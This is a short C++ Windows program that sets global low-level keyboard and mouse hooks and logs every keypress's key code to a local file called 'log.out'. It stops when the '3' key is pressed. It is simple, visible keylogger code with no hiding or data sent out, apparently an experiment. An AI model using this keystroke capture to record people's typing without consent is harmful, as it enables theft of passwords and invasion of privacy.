#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;
//callback function for the keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
//the hook
HHOOK keyboardHook;
HHOOK mouseHook;
POINT position;
//we use this variable to identify if the current window has changed
HWND prevWindow;
bool break_loop = false;
std::fstream file_out;
size_t counter = 0;
int main()
{
	file_out.open("log.out", std::ios_base::out);
	printf("Hooking the keyboard\n");
	printf("Hooking the mouse\n");
	//Here we set the low level hook
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, 0, 0);
	printf("%X\n", keyboardHook);
	printf("%X\n", mouseHook);

	MSG message{};
	//while (break_loop == false)
	//{
	//	GetMessage(&message, NULL, 0, 0);
	//	TranslateMessage(&message);
	//	DispatchMessage(&message);
	//	if (break_loop == true)
	//	{
	//		exit(0);
	//		goto KONIEC;
	//	}
	//}

	GetMessage(&message, NULL, 0, 0);
	//TranslateMessage(&message);
	//DispatchMessage(&message);
	UnhookWindowsHookEx(keyboardHook);
	UnhookWindowsHookEx(mouseHook);
//KONIEC:
	return 0;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	HWND fwindow = GetForegroundWindow();
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	//a key was pressed
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
		++counter;
		//std::cout << ((char)(key->vkCode)) << ' ';
		file_out << ((char)(key->vkCode)) << ' ';
		if (counter % 40 == 0)
		{
			file_out << '\n';
		}
	//	std::cout << ((char)(key->flags)) << ' ';
	//	std::cout << ((key->vkCode)) << ' ';
		if (((char)(key->vkCode)) == '3')
		{
			break_loop = true;
			file_out.close();
			PostQuitMessage(0);	//quit the loop
		}
		
	}
	//UnhookWindowsHookEx(keyboardHook);

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	HWND fwindow = GetForegroundWindow();
	//MOUSEHOOKSTRUCT * pMouseStruct = (MOUSEHOOKSTRUCT *)lParam;
	PMSLLHOOKSTRUCT mouse = (PMSLLHOOKSTRUCT)lParam;
	if (wParam == WM_LBUTTONDOWN)
	{
		std::cout << GetDoubleClickTime() << '\n';
		std::cout << 'd' << '\n';
		//wParam = WM_LBUTTONUP;
	}
	//if (pMouseStruct != NULL)
//	{
	//std::cout << "[ X:" << mouse->pt.x << " Y:" << mouse->pt.y << " ] " << mouse->mouseData << '\n';
	//std::cout << "[ X:" << mouse->pt.x << " Y:" << mouse->pt.y << " ] " << '\n';
	//printf("Mouse position X = %d  Mouse Position Y = %d\n", mouse->pt.x, mouse->pt.y);
	//}
	//delete pMouseStruct;
	//UnhookWindowsHookEx(mouseHook);
	return CallNextHookEx(mouseHook,nCode, wParam, lParam);
}